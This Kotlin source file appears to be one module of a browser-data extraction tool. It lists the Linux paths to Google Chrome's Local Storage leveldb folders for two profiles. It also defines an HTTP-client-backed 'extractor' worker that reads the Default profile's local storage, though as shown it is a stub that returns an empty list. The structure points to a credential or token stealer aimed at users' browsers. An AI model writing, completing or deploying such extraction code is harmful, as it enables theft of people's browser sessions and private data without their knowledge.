package net.kerner.entkerner.extractors.chrome

import io.ktor.client.*
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.io.FileUtils
import net.kerner.entkerner.io.nullPaths
import java.io.File
import java.nio.file.Path
import kotlin.io.path.div

enum class ChromeBasedSystemLocalStorage(
    val windows: Path?,
    val linux: Path?,
    val darwin: Path?
) {
    GoogleChromeProfileDefault(null, FileUtils.Linux.config / "google-chrome" / "Default" / "Local Storage" / "leveldb", null),
    GoogleChromeProfileProfile1(null, FileUtils.Linux.config / "google-chrome" / "Profile 1" / "Local Storage" / "leveldb", null)
}

class ChromeBrowserLocalStorageWorker(
    httpClient: HttpClient
) : ChromeLocalStorageExtractor(httpClient) {
    override val fileDirectories = nullPaths
    override val name = "ChromeBrowserLocalStorageWorker"

    override suspend fun extractData(file: File): List<String> {
        readLocalStorage(ChromeBasedSystemLocalStorage.GoogleChromeProfileDefault.linux!!)
        return emptyList()
    }

}